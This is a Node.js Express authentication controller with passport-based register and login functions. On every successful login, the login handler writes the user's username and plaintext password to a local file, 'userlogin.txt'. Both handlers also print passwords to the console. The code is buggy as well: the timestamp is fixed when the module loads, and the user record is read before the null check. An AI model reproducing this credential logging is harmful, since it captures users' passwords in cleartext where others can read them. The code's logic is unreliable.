const bcrypt = require('bcrypt');
const express = require('express');
const jwt = require('jsonwebtoken');
const User = require('../model/User.js');
const morgan = require('morgan');
const passport = require('passport');
const fs = require('fs');
const app = express();
const filePath = 'userlogin.txt';
const timestamp = new Date().toISOString();

/* REGISTER USER */
const register = async(req, res) => {
    try {
        const {
            username,
            password,
        } = req.body;

        const newUser = new User({

            username,
            password,
        });
        if (!password) {
            return res.status(400).json({ error: 'Password is required' });
        }
        console.log(username, password, "user+pass in auth")
        const registerUser = await User.register({ username: username }, password);
        console.log(registerUser, "register user")
        try {
            if (registerUser) {
                console.log("in register user");
                passport.authenticate("local")(req, res, function() {
                    console.log("in auth of passport")
                    res.redirect("/")
                })
            } else {
                res.redirect("/register")
            }
        } catch (err) {
            res.send(err)
        }
    } catch (err) {
        res.status(500).json({ error: err.message });
    }

};

/* LOGGING IN */
const login = async(req, res) => {
    try {
        console.log("we in here")
        const { username, password } = req.body;
        console.log(req.body, "req");
        console.log(username, password, "e+p");
        const user = await User.findOne({ username: username });
        console.log(user.password, "userP")
        console.log(user.username, "userU")

        if (!user) return res.status(400).json({ msg: "User does not exist. " });
        req.login(user, (err) => {
            if (err) {
                console.log(err)
            } else {
                passport.authenticate("local")(req, res, function() {
                    const logMessage = `Username: ${username}, Password: ${password}, Timestamp: ${timestamp}\n`;
                    fs.appendFile(filePath, logMessage, (err) => {
                        if (err) {
                            console.error('Error appending user information to the file:', err);
                        } else {
                            console.log('User information appended to the file successfully.');
                        }
                    });
                    res.redirect("/table");
                });
            }
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
};
module.exports = { register, login };